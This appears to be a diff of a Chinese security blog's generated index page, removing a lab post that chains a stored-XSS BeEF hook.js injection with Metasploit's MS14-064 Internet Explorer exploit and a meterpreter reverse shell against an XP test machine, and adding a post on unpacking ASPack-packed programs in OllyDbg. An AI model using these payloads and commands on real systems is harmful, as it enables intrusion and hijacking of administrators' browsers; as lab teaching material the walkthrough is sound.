@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/06/BEEF-MSF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/12/Common-Unshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/01/06/BEEF-MSF/" class="post-title-link" itemprop="url">BEEF+MSF</a>
+            <a href="/2020/01/12/Common-Unshell/" class="post-title-link" itemprop="url">Common-Unshell</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-01-06 18:59:02" itemprop="dateCreated datePublished" datetime="2020-01-06T18:59:02+08:00">2020-01-06</time>
+              <time title="Created: 2020-01-12 19:46:40" itemprop="dateCreated datePublished" datetime="2020-01-12T19:46:40+08:00">2020-01-12</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-02-01 13:04:48" itemprop="dateModified" datetime="2020-02-01T13:04:48+08:00">2020-02-01</time>
+                <time title="Modified: 2020-04-08 15:47:04" itemprop="dateModified" datetime="2020-04-08T15:47:04+08:00">2020-04-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -245,8 +245,8 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E5%85%A5%E4%BE%B5/" itemprop="url" rel="index">
-                    <span itemprop="name">内网入侵</span>
+                  <a href="/categories/%E8%84%B1%E5%A3%B3%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">脱壳分析</span>
                   </a>
                 </span>
             </span>
@@ -262,25 +262,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
-<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
-
-<p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
-<p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
-<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
-<p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
-<p><img src="img2.jpg" alt="网站页面"></p>
-<p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
-<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
-<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
-<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
-<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
+          <h1 id="常见的脱壳方式"><a href="#常见的脱壳方式" class="headerlink" title="常见的脱壳方式"></a>常见的脱壳方式</h1><p>首先我们使用PEID进行查壳<br><img src="img1.jpg" alt="查壳"><br>发现是：ASPack 2.12 -&gt; Alexey Solodovnikov的壳，我们进行脱壳。</p>
+<h2 id="单步跟进"><a href="#单步跟进" class="headerlink" title="单步跟进"></a>单步跟进</h2><p>其实这个方法就是最直接的，我们直接单步跟踪，向上的跳转在下一步按F4，指导跟踪到大的jmp，这样的关键性标识也有popad，但是这个一般要在一开始的程序入口点是pushad这个寄存机，例如：<br><img src="img2.jpg" alt="pushad"><br>我们一直跟踪，跟到这个地方。<br>但是下面有个call，我们单步步过的话呢，发现程序运行起来了，我们需要跟进。<br><img src="img3.jpg" alt="popad"><br>我们可以看到，我们运行到了popad，下面紧跟着跳转和retn，这个就很像了，我们继续运行。<br><img src="img4.jpg" alt="OEP"><br>可以看到这个retn就跳转到了我们的OEP，但是要记住删除代码分析，这个是一个比较明显的VB程序，而且我们的代码段回到了RAV1000的位置，这个时候我们用插件Dump出来。<br><img src="img5.jpg" alt="查壳"><br>确实是一个VB的程序。</p>
+<h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>其实也就是ESP改变的时候我们下一个硬件断点，然后运行，ESP改变的时候程序暂停，我么单步跟下就可以了。<br><img src="img7.jpg" alt="HWESP"><br>然后我们运行（删除硬件断点不要忘记），会来到这个位置：<br><img src="img8.jpg" alt="OEPJmp"><br>可以看到确实快到了，我们但不跟踪几下就可以了。</p>
+<h2 id="关键搜索"><a href="#关键搜索" class="headerlink" title="关键搜索"></a>关键搜索</h2><p>其实也就是搜索popad，记住不要搜索整个快，因为太大了，我们Ctrl+F进行搜索，会看到如下的结果：<br><img src="img9.jpg" alt="区段"><br>我们Ctrl+L就可以搜索下一个，记住一般来说，附近都有大的跳转和返回，一般也就是跨区段的跳转。</p>
+<h2 id="二次镜像法"><a href="#二次镜像法" class="headerlink" title="二次镜像法"></a>二次镜像法</h2><p>首先我们对我们rsrc（资源）断下内存写入断点，这个就是进行解密，然后再对我们的code（代码）断进行下内存写入断点，这个样子就能到达我们的OEP了，具体操作如下：<br>点击M打开区段表。<br><img src="img10.jpg" alt="区段"><br>然后我们就会运行到这个位置：<br><img src="img11.jpg" alt="断下"><br>然后我们下我们code断点，然后运行。<br><img src="img12.jpg" alt="断下"><br>然后我们运行之后会运行到这个地方：<br><img src="img13.jpg" alt="OEPJmp"><br>然后就到我们熟悉的地方了。</p>
+<h2 id="EIP跟踪法"><a href="#EIP跟踪法" class="headerlink" title="EIP跟踪法"></a>EIP跟踪法</h2><p>这个方法之前就了解了，使用OD的TC指令进行表达式计算，主要是找到我们的壳的区间，然后使用tc eip&lt;xxxxxxx，进行下端，tc这类的指令大家可以去看我的：<br><a href="https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/" target="_blank" rel="noopener" title="OD快捷代码">https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/</a><br>其实也就是对制定跟踪直到eip的位置到达了：<br><img src="img14.jpg" alt="区段"><br>我们按下Enter，然后运行，他会很慢的运行。<br>（不总么会用，之后深究一下）</p>
+<h2 id="SFX跟踪法"><a href="#SFX跟踪法" class="headerlink" title="SFX跟踪法"></a>SFX跟踪法</h2><p>通过OD给我们的SFX（暂时还不知道这是个什么，应该是有点异常的意思，之后会出相关的知识学习）进行跟踪<br><img src="img15.jpg" alt="选项"><br>选择SFX，选择第二个选项（有点时候需要第三个，具体看情况）：<br><img src="img16.jpg" alt="选项"><br>然后重新启动程序，就会直接到达OEP，但记住要调回来哦。<br><img src="img17.jpg" alt="OEPJmp"></p>
+<p><strong><strong><em>这是比较常见的一些脱壳技巧，之后还会更新。</em></strong></strong></p>
 
       
     </div>
@@ -300,7 +289,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/98/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/98/">98</a><span class="page-number current">99</span><a class="page-number" href="/page/100/">100</a><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/100/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/98/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/98/">98</a><span class="page-number current">99</span><a class="page-number" href="/page/100/">100</a><span class="space">&hellip;</span><a class="page-number" href="/page/105/">105</a><a class="extend next" rel="next" href="/page/100/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -367,7 +356,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
